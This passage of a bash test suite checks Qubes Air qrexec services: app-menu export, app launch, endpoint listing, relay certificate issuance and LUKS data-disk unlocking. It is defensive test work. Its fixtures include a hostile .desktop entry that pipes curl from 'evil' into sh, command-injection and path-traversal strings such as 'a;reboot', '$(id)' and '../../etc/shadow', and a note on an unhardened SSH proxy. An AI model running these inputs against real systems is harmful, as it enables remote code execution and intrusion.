    expect_stderr_has 'common name mismatch'
    case_end
}

t_issuerelaycert_empty_csr() {
    case_begin "IssueRelayCert: an empty CSR reaches the signer, whose refusal propagates" || return 0
    cert_setup
    put "$C/ctl/issue-relay-cert.rc" 1
    run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC"
    expect_rc 1
    expect_got_file issue-relay-cert "$C/stdin"
    case_end
}

# The wrapper neither truncates nor buffers; bounding the CSR is the signer's job.
t_issuerelaycert_large_csr() {
    case_begin "IssueRelayCert: a 3 MiB CSR reaches the signer unmodified" || return 0
    cert_setup
    cp "$BLOB" "$C/stdin"
    run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC"
    expect_rc 0
    expect_got_file issue-relay-cert "$BLOB"
    case_end
}

# =====================================================================================
# console/qrexec/qubesair.RemoteEndpoints — "<name> <ip:port>" list for the relay.
# =====================================================================================
ep_setup() {
    install_svc console/qrexec/qubesair.RemoteEndpoints "/usr/local/bin/=$CUR/abs/"
    stub_abs list-endpoints
}

t_remoteendpoints_lists() {
    case_begin "RemoteEndpoints: lists endpoints from the console database" || return 0
    ep_setup
    put "$C/ctl/list-endpoints.stdout" $'remote-a 10.0.0.5:8443\nremote-b 10.0.0.6:8443\n'
    run_svc "QUBES_AIR_DATA_DIR=$C/console" QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC"
    expect_rc 0
    expect_stdout $'remote-a 10.0.0.5:8443\nremote-b 10.0.0.6:8443'
    expect_calls "list-endpoints [-db] [$C/console/qubes-air.db]"
    case_end
}

t_remoteendpoints_default_data_dir() {
    case_begin "RemoteEndpoints: defaults to the salt-managed data directory" || return 0
    ep_setup
    run_svc QREXEC_REMOTE_DOMAIN=sys-relay -- "$SVC"
    expect_rc 0
    expect_calls "list-endpoints [-db] [/rw/config/qubesair/qubes-air.db]"
    case_end
}

t_remoteendpoints_empty() {
    case_begin "RemoteEndpoints: no remotes is an empty, successful answer" || return 0
    ep_setup
    run_svc "QUBES_AIR_DATA_DIR=$C/console" -- "$SVC"
    expect_rc 0
    expect_stdout_empty
    case_end
}

t_remoteendpoints_argument_not_forwarded() {
    case_begin "RemoteEndpoints: a service argument is not forwarded" || return 0
    ep_setup
    run_svc "QUBES_AIR_DATA_DIR=$C/console" -- "$SVC" '../../etc/shadow'
    expect_rc 0
    expect_calls "list-endpoints [-db] [$C/console/qubes-air.db]"
    case_end
}

t_remoteendpoints_ignores_stdin() {
    case_begin "RemoteEndpoints: 3 MiB of stdin does not change the answer" || return 0
    ep_setup
    cp "$BLOB" "$C/stdin"
    put "$C/ctl/list-endpoints.stdout" 'remote-a 10.0.0.5:8443'
    run_svc "QUBES_AIR_DATA_DIR=$C/console" -- "$SVC"
    expect_rc 0
    expect_stdout 'remote-a 10.0.0.5:8443'
    case_end
}

t_remoteendpoints_exit_status_propagates() {
    case_begin "RemoteEndpoints: a database failure exit reaches the relay" || return 0
    ep_setup
    put "$C/ctl/list-endpoints.rc" 2
    put "$C/ctl/list-endpoints.stderr" 'list-endpoints: database is locked'
    run_svc "QUBES_AIR_DATA_DIR=$C/console" -- "$SVC"
    expect_rc 2
    expect_stderr_has 'database is locked'
    case_end
}

t_remoteendpoints_large_answer() {
    case_begin "RemoteEndpoints: a 3 MiB answer passes through byte-exact" || return 0
    ep_setup
    cp "$BLOB" "$C/ctl/list-endpoints.stdout"
    run_svc "QUBES_AIR_DATA_DIR=$C/console" -- "$SVC"
    expect_rc 0
    expect_stdout_file "$BLOB"
    case_end
}

# =====================================================================================
# remote/qubes-rpc/qubes.GetAppmenus — menu entries for dom0's qvm-sync-appmenus.
# =====================================================================================
APPS='usr/share/applications'

menus_setup() {
    install_svc remote/qubes-rpc/qubes.GetAppmenus \
        "/usr/share/applications=$CUR/root/usr/share/applications" \
        "/usr/local/share/applications=$CUR/root/usr/local/share/applications" \
        "/home/*=$CUR/root/home/*"
}

menus_run() { run_svc QREXEC_REMOTE_DOMAIN=dom0 -- "$SVC" "$@"; }

expect_sorted_stdout() {
    local got
    got="$(LC_ALL=C sort "$C/stdout")"
    [ "$got" = "$1" ] || fail "menu lines (sorted):
      want: $(printf '%s' "$1" | sed '2,$s/^/            /')
      got:  $(printf '%s' "$got" | sed '2,$s/^/            /')"
}

CALC=$'[Desktop Entry]\nType=Application\nName=Calculator\nExec=gnome-calculator %U\nIcon=org.gnome.Calculator\n\n[Desktop Action new-window]\nName=New Window\nExec=gnome-calculator --new-window\n'
CALC_LINES='org.gnome.Calculator.desktop:Type=Application
org.gnome.Calculator.desktop:Name=Calculator
org.gnome.Calculator.desktop:Exec=qubes-desktop-run org.gnome.Calculator.desktop
org.gnome.Calculator.desktop:Icon=org.gnome.Calculator'

t_getappmenus_empty_system() {
    case_begin "GetAppmenus: no application directories is an empty menu" || return 0
    menus_setup
    menus_run
    expect_rc 0
    expect_stdout_empty
    expect_no_calls
    case_end
}

t_getappmenus_entry() {
    case_begin "GetAppmenus: emits the Desktop Entry with Exec rewritten to qubes-desktop-run" || return 0
    menus_setup
    put "$C/root/$APPS/org.gnome.Calculator.desktop" "$CALC"
    menus_run
    expect_rc 0
    expect_stdout "$CALC_LINES"
    expect_stdout_lacks 'gnome-calculator'
    case_end
}

t_getappmenus_hidden_entries() {
    case_begin "GetAppmenus: NoDisplay and Screensaver entries are dropped whole" || return 0
    menus_setup
    put "$C/root/$APPS/nodisplay.desktop" $'[Desktop Entry]\nName=Hidden\nExec=x\nNoDisplay=true\n'
    put "$C/root/$APPS/spaced.desktop" $'[Desktop Entry]\nName=Hidden2\nNoDisplay = true \n'
    put "$C/root/$APPS/saver.desktop" $'[Desktop Entry]\nName=Saver\nCategories=Screensaver;X-Foo;\n'
    put "$C/root/$APPS/shown.desktop" $'[Desktop Entry]\nName=Shown\nNoDisplay=false\n'
    menus_run
    expect_rc 0
    expect_stdout 'shown.desktop:Name=Shown'
    case_end
}

t_getappmenus_layout() {
    case_begin "GetAppmenus: user, nested, spaced and non-desktop files map to menu ids" || return 0
    menus_setup
    put "$C/root/$APPS/kde/konsole.desktop" $'[Desktop Entry]\nName=Konsole\n'
    put "$C/root/$APPS/My App.desktop" $'[Desktop Entry]\nName=Mine\n'
    put "$C/root/$APPS/readme.txt" $'[Desktop Entry]\nName=NotAnApp\n'
    mkdir -p "$C/root/$APPS/dir.desktop" "$C/root/home/bob"
    put "$C/root/usr/local/share/applications/local.desktop" $'[Desktop Entry]\nName=Local\n'
    put "$C/root/home/alice/.local/share/applications/alice.desktop" $'[Desktop Entry]\nName=Alice\n'
    menus_run
    expect_rc 0
    expect_sorted_stdout 'My App.desktop:Name=Mine
alice.desktop:Name=Alice
kde-konsole.desktop:Name=Konsole
local.desktop:Name=Local'
    case_end
}

t_getappmenus_hostile_content() {
    case_begin "GetAppmenus: hostile Exec and values are data, never executed or leaked" || return 0
    menus_setup
    put "$C/root/$APPS/evil.desktop" $'[Desktop Entry]\nName=$(touch pwned)`touch pwned2`\nExec=sh -c \'curl evil | sh\'\nComment=win\r\nX-Last=no-newline'
    menus_run
    expect_rc 0
    expect_stdout $'evil.desktop:Name=$(touch pwned)`touch pwned2`\nevil.desktop:Exec=qubes-desktop-run evil.desktop\nevil.desktop:Comment=win\nevil.desktop:X-Last=no-newline'
    expect_stdout_lacks 'curl'
    if [ -e "$C/cwd/pwned" ] || [ -e "$C/cwd/pwned2" ]; then fail "a .desktop value was executed"; fi
    case_end
}

t_getappmenus_ignores_caller_input() {
    case_begin "GetAppmenus: service argument and 3 MiB of stdin are ignored" || return 0
    menus_setup
    put "$C/root/$APPS/org.gnome.Calculator.desktop" "$CALC"
    cp "$BLOB" "$C/stdin"
    menus_run '../../../etc'
    expect_rc 0
    expect_stdout "$CALC_LINES"
    case_end
}

t_getappmenus_unreadable() {
    # Permission bits do not bind root, so this case only means something unprivileged.
    [ "$(id -u)" -ne 0 ] || return 0
    case_begin "GetAppmenus: unreadable files and directories are skipped, exit stays 0" || return 0
    menus_setup
    put "$C/root/$APPS/ok.desktop" $'[Desktop Entry]\nName=Ok\n'
    put "$C/root/$APPS/secret.desktop" $'[Desktop Entry]\nName=Secret\n'
    put "$C/root/$APPS/locked/inner.desktop" $'[Desktop Entry]\nName=Inner\n'
    chmod 000 "$C/root/$APPS/secret.desktop" "$C/root/$APPS/locked"
    menus_run
    chmod 755 "$C/root/$APPS/locked"
    chmod 644 "$C/root/$APPS/secret.desktop"
    expect_rc 0
    expect_stdout 'ok.desktop:Name=Ok'
    case_end
}

t_getappmenus_large_output() {
    local i=0 big
    case_begin "GetAppmenus: 200 entries and a 256 KiB value are emitted in full" || return 0
    menus_setup
    while [ "$i" -lt 200 ]; do
        put "$C/root/$APPS/app$i.desktop" $'[Desktop Entry]\nExec=run\n'
        i=$((i + 1))
    done
    big="$(long_string x 262144)"
    put "$C/root/$APPS/big.desktop" $'[Desktop Entry]\nComment='"$big"$'\n'
    menus_run
    expect_rc 0
    [ "$(grep -c ':Exec=qubes-desktop-run app' "$C/stdout")" -eq 200 ] || fail "want 200 Exec lines"
    printf 'big.desktop:Comment=%s\n' "$big" >"$C/want-big"
    grep '^big.desktop:' "$C/stdout" >"$C/got-big"
    cmp -s "$C/want-big" "$C/got-big" || fail "the 256 KiB Comment was not emitted intact"
    case_end
}

# =====================================================================================
# remote/qubes-rpc/qubes.StartApp — launch an app id on the Xpra display.
# =====================================================================================
make_stub passwd getent <<'EOF'
[ "$1" = passwd ] || exit 2
awk -F: -v k="$2" '$1 == k || $3 == k { print; found = 1 } END { exit (found ? 0 : 2) }' "$C/passwd"
EOF
make_stub passwd id <<'EOF'
[ "$1" = -u ] || exit 1
awk -F: -v k="$2" '$1 == k { print $3; found = 1 } END { exit (found ? 0 : 1) }' "$C/passwd"
EOF

start_setup() {
    install_svc remote/qubes-rpc/qubes.StartApp
    put "$C/passwd" $'root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\n'
    link_stub passwd getent
    link_stub passwd id
    stub systemd-run
    stub runuser
}

start_calls() { # APP: the full command sequence of a systemd launch
    printf 'getent [passwd] [1000]\ngetent [passwd] [alice]\nid [-u] [alice]\n'
    printf 'systemd-run [--collect] [--quiet] [--uid=alice] [--setenv=HOME=/home/alice] [--setenv=DISPLAY=:100] [--setenv=XDG_RUNTIME_DIR=/run/user/1000] [--] [qubes-desktop-run] [%s]' "$1"
}

t_startapp_missing_id() {
    local arg
    for arg in '' '<none>'; do
        case_begin "StartApp: missing app id ($arg) launches nothing" || continue
        start_setup
        if [ "$arg" = '<none>' ]; then run_svc -- "$SVC"; else run_svc -- "$SVC" "$arg"; fi
        expect_rc 0
        expect_stdout 'qubes.StartApp: missing app id (pass it as the qrexec service argument)'
        expect_no_calls
        case_end
    done
}

t_startapp_illegal_id() {
    local app
    for app in 'a b' 'a;reboot' '../../usr/bin/id' 'a/b' '$(id)' '`id`' $'a\nb' 'a|b' 'a&b' \
        '*' "a'b" 'a"b' 'a\b' 'gedit%U' 'a>b'; do
        case_begin "StartApp: app id '$app' is refused" || continue
        start_setup
        run_svc -- "$SVC" "$app"
        expect_rc 0
        expect_stdout "qubes.StartApp: refusing suspicious app id '$app'"
        expect_no_calls
        case_end
    done
}

# A leading '-' lands after `--` and is only ever a file name to qubes-desktop-run;
# a long id stays one argument (the agent caps service+argument at 128 bytes).
t_startapp_launches() {
    local app
    for app in org.gnome.Calculator org.kde.konsole.desktop 'a_b-c+d' '-h' "$(long_string a 4096)"; do
        case_begin "StartApp: '${app:0:40}' launches as the desktop user on the Xpra display" || continue
        start_setup
        cp "$BLOB" "$C/stdin"
        run_svc -- "$SVC" "$app"
        expect_rc 0
        expect_stdout "qubes.StartApp: launched '$app' on :100"
        expect_calls "$(start_calls "$app")"
        case_end
    done
}

t_startapp_launch_failure() {
    case_begin "StartApp: a failed launch is reported on stdout, exit stays 0" || return 0
    start_setup
    put "$C/ctl/systemd-run.rc" 1
    put "$C/ctl/systemd-run.stderr" 'Failed to start transient service unit: Unit already exists.'
    run_svc -- "$SVC" gedit
    expect_rc 0
    expect_stdout "qubes.StartApp: failed to launch 'gedit' on :100: Failed to start transient service unit: Unit already exists."
    case_end
}

t_startapp_large_launcher_output() {
    case_begin "StartApp: 1 MiB of launcher output is relayed, exit stays 0" || return 0
    start_setup
    put "$C/ctl/systemd-run.rc" 1
    long_string e 1048576 >"$C/ctl/systemd-run.stderr"
    run_svc -- "$SVC" gedit
    expect_rc 0
    [ "$(wc -c <"$C/stdout")" -gt 1048576 ] || fail "the launcher output was truncated"
    case_end
}

t_startapp_without_systemd() {
    case_begin "StartApp: without systemd-run it uses runuser with the Xpra environment" || return 0
    start_setup
    rm -f "$C/bin/systemd-run"
    run_svc QUBESAIR_XPRA_DISPLAY=:101 -- "$SVC" gedit
    expect_rc 0
    expect_stdout "qubes.StartApp: launched 'gedit' on :101"
    expect_calls 'getent [passwd] [1000]
getent [passwd] [alice]
runuser [-u] [alice] [--] [qubes-desktop-run] [gedit]'
    expect_got_env runuser 'DISPLAY=:101'
    expect_got_env runuser 'HOME=/home/alice'
    case_end
}

t_startapp_runuser_failure() {
    case_begin "StartApp: a failing runuser is reported, exit stays 0" || return 0
    start_setup
    rm -f "$C/bin/systemd-run"
    put "$C/ctl/runuser.rc" 1
    put "$C/ctl/runuser.stderr" 'runuser: user alice does not exist'
    run_svc -- "$SVC" gedit
    expect_rc 0
    expect_stdout "qubes.StartApp: failed to launch 'gedit' on :100: runuser: user alice does not exist"
    case_end
}

# =====================================================================================
# remote/qubes-rpc/qubesair.UnlockData — open (first boot: format) the LUKS data disk.
# stdin = passphrase; stdout = one JSON line; always exit 0.
# =====================================================================================
# The passphrase the cases send: base64 like the console's data keys, built at
# run time from a plain-text marker so the source holds no key-shaped literal.
KEY="$(printf '%s' 'qrexec-harness-fixture-not-a-real-disk-passphrase' | base64 | tr -d '=\n')"
[ "${#KEY}" -ge 40 ] || die "could not build the fixture passphrase (is base64 installed?)"
DEV=''
MAPPED=''
DATA=''

# A fake data disk. $C/disk holds its state: luks-key (the disk is LUKS and opens
# with exactly these bytes), raw-fstype (a plaintext filesystem on the raw disk),
# mapped-fstype (the open container holds a filesystem) and mounted.
unlock_setup() {
    install_svc remote/qubes-rpc/qubesair.UnlockData \
        "/data=$CUR/root/data" \
        "/etc/qubes-rpc/qubesair.UnlockData=$SVCDIR/qubesair.UnlockData" \
        "/dev/disk/by-path/=$CUR/root/dev/disk/by-path/" \
        "/dev/mapper/=$CUR/root/dev/mapper/"
    # readlink -f in the service resolves the $CUR symlink; the mapper and mount
    # paths are the literal rewrites.
    DEV="$C/root/dev/sdb"
    MAPPED="$CUR/root/dev/mapper/qubesair-data"
    DATA="$CUR/root/data"
    mkdir -p "$C/root/dev/disk/by-path" "$C/root/dev/mapper" "$C/disk"
    : >"$DEV"
    ln -s ../../sdb "$C/root/dev/disk/by-path/pci-0000:00:05.0-scsi-0:0:0:1"
    local tool
    for tool in cryptsetup blkid mkfs.ext4 mountpoint mount systemd-run; do
        link_stub unlock "$tool"
    done
}

make_stub unlock cryptsetup <<'EOF'
keyfile=''
for a in "$@"; do case "$a" in --key-file=*) keyfile="${a#--key-file=}" ;; esac; done
last="${!#}"
case "$1" in
isLuks) [ -f "$C/disk/luks-key" ]; exit $? ;;
luksFormat)
    if [ -f "$C/ctl/luksFormat.rc" ]; then echo 'luksFormat: scripted failure' >&2; exit "$(cat "$C/ctl/luksFormat.rc")"; fi
    cat "$keyfile" >"$C/disk/luks-key"; exit 0 ;;
luksOpen)
    if [ -f "$C/disk/luks-key" ] && cmp -s "$keyfile" "$C/disk/luks-key"; then : >"$C/root/dev/mapper/$last"; exit 0; fi
    echo 'No key available with this passphrase.' >&2; exit 2 ;;
esac
echo "cryptsetup stub: unexpected $1" >&2
exit 99
EOF
make_stub unlock blkid <<'EOF'
case "${!#}" in */dev/mapper/*) f="$C/disk/mapped-fstype" ;; *) f="$C/disk/raw-fstype" ;; esac
if [ -s "$f" ]; then cat "$f"; exit 0; fi
exit 2
EOF
make_stub unlock mkfs.ext4 <<'EOF'
printf 'ext4\n' >"$C/disk/mapped-fstype"
EOF
make_stub unlock mountpoint <<'EOF'
[ -f "$C/disk/mounted" ]
EOF
make_stub unlock mount <<'EOF'
if [ -f "$C/ctl/mount.rc" ]; then echo 'mount: scripted failure' >&2; exit "$(cat "$C/ctl/mount.rc")"; fi
: >"$C/disk/mounted"
EOF
# A transient unit starts from PID 1's environment, not the caller's; model
# that so a case cannot pass on a variable that leaked through.
make_stub unlock systemd-run <<'EOF'
envs=()
while [ "$#" -gt 0 ]; do
    case "$1" in
    --) shift; break ;;
    --setenv=*) envs+=("${1#--setenv=}"); shift ;;
    -*) shift ;;
    *) break ;;
    esac
done
if [ -f "$C/ctl/systemd-run.rc" ]; then echo 'Failed to connect to bus' >&2; exit "$(cat "$C/ctl/systemd-run.rc")"; fi
exec env -i "PATH=$PATH" ${envs[@]+"${envs[@]}"} "$@"
EOF

unlock_run() {
    run_svc QREXEC_REMOTE_DOMAIN=console QREXEC_SERVICE_FULL_NAME=qubesair.UnlockData -- "$SVC" "$@"
}

# The line that starts the privileged half. The systemd-run stub drops the
# caller's environment, so the marker only arrives through --setenv.
unlock_inner_call() {
    printf 'systemd-run [--pipe] [--wait] [--collect] [--quiet] [--setenv=QUBESAIR_UNLOCK_INNER=1] [--] [%s] [__unlock]' "$SVC"
}

# Nothing the service ran may carry the passphrase in argv, and every key file
# must be a pipe (process substitution), never a path on disk.
expect_key_off_argv() {
    if grep -qF -- "$1" "$C/calls.log"; then fail "the passphrase appeared in a command line"; fi
    if calls | grep -- '--key-file=' | grep -qv -- '--key-file=/dev/fd/N'; then
        fail "a key file was not a pipe: $(calls | grep -- '--key-file=' | tr '\n' ';')"
    fi
}

expect_disk_key() {
    printf '%s' "$1" >"$C/want-key"
    cmp -s "$C/want-key" "$C/disk/luks-key" || fail "the container key is not exactly the passphrase bytes"
}

t_unlockdata_empty_passphrase() {
    local input
    for input in '' $'\n'; do
        case_begin "UnlockData: empty passphrase ($(printf '%q' "$input")) touches nothing" || continue
        unlock_setup
        put "$C/stdin" "$input"
        unlock_run
        expect_rc 0
        expect_stdout '{"unlocked":false,"detail":"empty passphrase"}'
        expect_no_calls
        case_end
    done
}

# The console never sends an argument. "__unlock" used to select the privileged
# half directly, skipping the empty-passphrase check and systemd-run.
t_unlockdata_refuses_service_argument() {
    local arg input
    for arg in __unlock foo '../../etc/passwd'; do
        for input in '' "$KEY"; do
            case_begin "UnlockData: service argument '$arg' is refused (stdin $(printf '%q' "${input:0:8}"))" || continue
            unlock_setup
            put "$C/stdin" "$input"
            unlock_run "$arg"
            expect_rc 0
            expect_stdout '{"unlocked":false,"detail":"service arguments are not supported"}'
            expect_no_calls
            [ ! -e "$C/disk/luks-key" ] || fail "the disk was formatted"
            case_end
        done
    done
}

t_unlockdata_first_boot() {
    case_begin "UnlockData: a blank disk is formatted, opened, given ext4 and mounted" || return 0
    unlock_setup
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":true,"detail":"unlocked and mounted"}'
    expect_calls "$(unlock_inner_call)
cryptsetup [isLuks] [$DEV]
blkid [-o] [value] [-s] [TYPE] [$DEV]
cryptsetup [luksFormat] [--type] [luks2] [--batch-mode] [--pbkdf] [pbkdf2] [--pbkdf-force-iterations] [1000] [--key-file=/dev/fd/N] [$DEV]
cryptsetup [luksOpen] [--key-file=/dev/fd/N] [$DEV] [qubesair-data]
blkid [-o] [value] [-s] [TYPE] [$MAPPED]
mkfs.ext4 [-q] [-L] [qubesair-data] [$MAPPED]
mountpoint [-q] [$DATA]
mount [$MAPPED] [$DATA]
mountpoint [-q] [$DATA]"
    expect_key_off_argv "$KEY"
    expect_disk_key "$KEY"
    [ -d "$DATA" ] || fail "the mount point was not created"
    case_end
}

t_unlockdata_existing_container() {
    case_begin "UnlockData: an existing container is opened and mounted, never reformatted" || return 0
    unlock_setup
    put "$C/disk/luks-key" "$KEY"
    put "$C/disk/mapped-fstype" 'ext4'
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":true,"detail":"unlocked and mounted"}'
    expect_calls "$(unlock_inner_call)
cryptsetup [isLuks] [$DEV]
cryptsetup [luksOpen] [--key-file=/dev/fd/N] [$DEV] [qubesair-data]
blkid [-o] [value] [-s] [TYPE] [$MAPPED]
mountpoint [-q] [$DATA]
mount [$MAPPED] [$DATA]
mountpoint [-q] [$DATA]"
    expect_key_off_argv "$KEY"
    case_end
}

t_unlockdata_wrong_key() {
    case_begin "UnlockData: a wrong key fails luksOpen and mounts nothing" || return 0
    unlock_setup
    put "$C/disk/luks-key" 'the-real-key'
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":false,"detail":"luksOpen failed (wrong key?)"}'
    expect_not_called mkfs.ext4
    expect_not_called mount
    expect_disk_key 'the-real-key'
    case_end
}

t_unlockdata_refuses_plaintext_disk() {
    case_begin "UnlockData: a disk with a plaintext filesystem is never overwritten" || return 0
    unlock_setup
    put "$C/disk/raw-fstype" 'ext4'
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":false,"detail":"disk carries a ext4 filesystem, not LUKS; refusing to overwrite"}'
    expect_calls "$(unlock_inner_call)
cryptsetup [isLuks] [$DEV]
blkid [-o] [value] [-s] [TYPE] [$DEV]"
    [ ! -e "$C/disk/luks-key" ] || fail "the plaintext disk was formatted"
    case_end
}

t_unlockdata_no_disk() {
    case_begin "UnlockData: no scsi1 data disk is reported, nothing is touched" || return 0
    unlock_setup
    rm -f "$C/root/dev/disk/by-path/"*
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":false,"detail":"no data disk (scsi1) attached"}'
    expect_calls "$(unlock_inner_call)"
    case_end
}

t_unlockdata_idempotent() {
    case_begin "UnlockData: an open and mounted disk is left alone" || return 0
    unlock_setup
    put "$C/disk/luks-key" "$KEY"
    : >"$MAPPED"
    : >"$C/disk/mounted"
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":true,"detail":"already unlocked and mounted"}'
    expect_calls "$(unlock_inner_call)
mountpoint [-q] [$DATA]"
    case_end
}

t_unlockdata_format_failure() {
    case_begin "UnlockData: luksFormat failing stops before open, mkfs and mount" || return 0
    unlock_setup
    put "$C/ctl/luksFormat.rc" 1
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":false,"detail":"luksFormat failed"}'
    expect_not_called mkfs.ext4
    expect_not_called mount
    if calls | grep -q 'luksOpen'; then fail "luksOpen ran after a failed format"; fi
    case_end
}

t_unlockdata_mount_failure() {
    case_begin "UnlockData: a failing mount is reported as not unlocked" || return 0
    unlock_setup
    put "$C/disk/luks-key" "$KEY"
    put "$C/disk/mapped-fstype" 'ext4'
    put "$C/ctl/mount.rc" 32
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":false,"detail":"opened but mount failed"}'
    case_end
}

# No JSON is not success: the console treats an unparseable reply as an error.
t_unlockdata_systemd_run_failure() {
    case_begin "UnlockData: systemd-run itself failing never reports success" || return 0
    unlock_setup
    put "$C/ctl/systemd-run.rc" 1
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout_lacks '"unlocked":true'
    expect_not_called cryptsetup
    case_end
}

t_unlockdata_without_systemd() {
    case_begin "UnlockData: without systemd-run the privileged half runs directly" || return 0
    unlock_setup
    rm -f "$C/bin/systemd-run"
    put "$C/stdin" "$KEY"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":true,"detail":"unlocked and mounted"}'
    expect_disk_key "$KEY"
    expect_key_off_argv "$KEY"
    case_end
}

t_unlockdata_passphrase_is_literal() {
    local key='k3y with spaces;$(touch pwned)`id`*'
    case_begin "UnlockData: passphrase bytes are used literally, never interpreted" || return 0
    unlock_setup
    put "$C/stdin" "$key"
    unlock_run
    expect_rc 0
    expect_stdout '{"unlocked":true,"detail":"unlocked and mounted"}'
    expect_disk_key "$key"
    expect_key_off_argv "$key"
    [ ! -e "$C/cwd/pwned" ] || fail "the passphrase was executed"
    case_end
}

t_unlockdata_trailing_newline() {
    case_begin "UnlockData: a trailing newline is not part of the passphrase" || return 0
    unlock_setup
    put "$C/stdin" "$KEY"$'\n'
    unlock_run
    expect_rc 0
    expect_disk_key "$KEY"
    case_end
}

# =====================================================================================
# Inventory: every file in the service directories belongs to exactly one suite.
# =====================================================================================
SHELL_SUITE='qubes.GetAppmenus qubes.StartApp qubesair.ConnectTCP qubesair.GrpcProxy
qubesair.IssueRelayCert qubesair.RemoteEndpoints qubesair.UnlockData'
# <service>:<Go test that executes the real script>
GO_SUITE='qubesair.Exec:console/backend/internal/agent/exec_service_test.go
qubesair.FileCopy:console/backend/internal/agent/filecopy_service_test.go
qubesair.Ping:console/backend/internal/agent/invoker_test.go
qubesair.RekeyData:console/backend/internal/agent/rekeydata_service_test.go'
# The SSH transport that GrpcProxy replaced. It applies no character allowlist to
# the target or service (only qrexec's own argument charset stands in the way) and
# hands the service string to ssh, whose remote side parses it with a shell.
# Whether to delete or harden it is an open decision, so it is left out on purpose
# and named here so the gap stays visible.
NOT_COVERED='qubesair.SSHProxy'

in_list() { # WORD LIST
    case " $(printf '%s' "$2" | tr '\n' ' ') " in *" $1 "*) return 0 ;; esac
    return 1
}

t_zz_inventory() {
    local files file name go_test owners
    case_begin "inventory: every service file is owned by exactly one suite" || return 0
    if git -C "$REPO_ROOT" rev-parse --git-dir >/dev/null 2>&1; then
        files="$(git -C "$REPO_ROOT" ls-files -- remote/qubes-rpc console/qrexec relay/transport)"
    else
        files="$(cd "$REPO_ROOT" && find remote/qubes-rpc console/qrexec relay/transport -type f)"
    fi
    [ -n "$files" ] || fail "no service files found"
    while IFS= read -r file; do
        [ -n "$file" ] || continue
        name="${file##*/}"
        owners=0
        if in_list "$name" "$SHELL_SUITE"; then owners=$((owners + 1)); fi
        if in_list "$name" "$NOT_COVERED"; then owners=$((owners + 1)); fi
        go_test="$(printf '%s\n' "$GO_SUITE" | awk -F: -v n="$name" '$1 == n { print $2 }')"
        if [ -n "$go_test" ]; then
            owners=$((owners + 1))
            grep -qF "qubes-rpc/$name" "$REPO_ROOT/$go_test" 2>/dev/null ||
                fail "$file: $go_test no longer runs the real script"
        fi
        [ "$owners" -eq 1 ] || fail "$file: owned by $owners suites; list it exactly once in scripts/test-qrexec-services.sh"
    done <<EOF
$files
EOF
    # Ownership alone is vacuous if no case runs the service (say its t_* group
    # was renamed). Only meaningful when no filter narrowed the run.
    if [ -z "$FILTER" ]; then
        for name in $SHELL_SUITE; do
            in_list "$name" "$EXERCISED" || fail "$name: in the shell suite, but no case ran it"
        done
    fi
    case_end
}

# ---- run ----------------------------------------------------------------------------
for group in $(declare -F | sed -n 's/^declare -f \(t_[A-Za-z0-9_]*\)$/\1/p'); do
    "$group"
done

[ "$CASES" -gt 0 ] || die "no case matched '$FILTER'"
printf '\nqrexec service tests: %d passed, %d failed\n' "$((CASES - FAILED))" "$FAILED"
if [ "$FAILED" -gt 0 ]; then
    printf 'failed:%s\n' "$FAILED_NAMES"
    exit 1
fi
